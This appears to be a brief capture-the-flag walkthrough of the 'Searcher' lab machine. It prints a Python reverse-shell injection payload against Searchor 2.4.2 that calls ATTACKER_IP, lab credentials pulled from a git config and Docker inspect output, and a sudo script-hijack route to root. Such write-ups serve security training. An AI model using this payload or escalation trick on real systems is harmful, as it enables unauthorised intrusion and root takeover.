![file:///tmp/.ZBR081/1.png](file:///tmp/.ZBR081/1.png)

exploit:

[https://github.com/jonnyzar/POC-Searchor-2.4.2](https://github.com/jonnyzar/POC-Searchor-2.4.2)

payload:

', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

![file:///tmp/.ZBR081/2.png](file:///tmp/.ZBR081/2.png)

![file:///tmp/.ZBR081/3.png](file:///tmp/.ZBR081/3.png)

![file:///tmp/.ZBR081/4.png](file:///tmp/.ZBR081/4.png)

do ls -al

go to .git/ and read the config

[http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git](http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git)

![file:///tmp/.ZBR081/5.png](file:///tmp/.ZBR081/5.png)

![file:///tmp/.ZBR081/6.png](file:///tmp/.ZBR081/6.png)

sudo /usr/bin/python3 /opt/scripts/system-checkup.py

[Documentation](https://docs.docker.com/engine/reference/commandline/inspect/)

## : "

_Return low-level information on Docker objects_

## ".

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a

"Hostname":"f84a6b33fb5a"

MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF

MYSQL_USER=gitea

MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh

MYSQL_DATABASE=gitea

![file:///tmp/.ZBR081/7.png](file:///tmp/.ZBR081/7.png)

![file:///tmp/.ZBR081/8.png](file:///tmp/.ZBR081/8.png)

![file:///tmp/.ZBR081/9.png](file:///tmp/.ZBR081/9.png)

one of the password worked for admin it was: yuiu1hoiu4i5ho1uh

![file:///tmp/.ZBR081/10.png](file:///tmp/.ZBR081/10.png)

now in the system-checkup file:

![file:///tmp/.ZBR081/11.png](file:///tmp/.ZBR081/11.png) this code blindly runs the full-checkup.sh file in it's dir and we can thus create our own this file and run this code as root